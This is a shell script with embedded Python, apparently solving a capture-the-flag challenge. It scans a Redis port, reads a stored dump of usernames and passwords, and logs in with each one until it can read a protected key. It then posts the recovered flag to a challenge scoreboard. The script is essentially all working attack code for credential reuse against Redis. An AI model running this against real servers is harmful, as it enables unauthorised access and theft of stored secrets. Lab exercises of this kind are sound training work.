#!/bin/sh
set -eu

host=172.20.0.147
nmap -n -Pn -p 6379 --open "$host" >/dev/null

flag=$(python3 - "$host" <<'PY'
import socket
import sys

host = sys.argv[1]
sock = socket.create_connection((host, 6379), timeout=5)
reader = sock.makefile('rb')

def command(*parts):
    payload = [f'*{len(parts)}\r\n'.encode()]
    for part in parts:
        value = str(part).encode()
        payload.extend((f'${len(value)}\r\n'.encode(), value, b'\r\n'))
    sock.sendall(b''.join(payload))
    return read_reply()

def read_reply():
    prefix = reader.read(1)
    if not prefix:
        raise RuntimeError('connection closed')
    line = reader.readline().rstrip(b'\r\n')
    if prefix == b'+':
        return line.decode()
    if prefix == b'-':
        raise RuntimeError(line.decode())
    if prefix == b':':
        return int(line)
    if prefix == b'$':
        length = int(line)
        if length < 0:
            return None
        data = reader.read(length)
        reader.read(2)
        return data.decode()
    if prefix == b'*':
        count = int(line)
        return [read_reply() for _ in range(count)] if count >= 0 else None
    raise RuntimeError(f'unexpected Redis reply: {prefix!r}')

ledger = command('GET', 'dump:sealed-ledger')
accounts = command('ACL', 'USERS')
if not ledger or not accounts:
    raise RuntimeError('missing service evidence')

rows = [line.split(',') for line in ledger.splitlines()]
for row in rows[1:]:
    username, password, _timestamp = row
    if username not in accounts:
        continue
    command('AUTH', username, password)
    result = command('GET', 'vault:dispatch')
    if result:
        print(result)
        break
else:
    raise RuntimeError('no matching live account found')

sock.close()
PY
)

python3 - "$flag" <<'PY' | curl -sS http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-
import json
import sys
print(json.dumps({
    'challenge_id': 'scl-challenge-frame-6e4473',
    'task_id': 'task1',
    'flag': sys.argv[1],
}))
PY
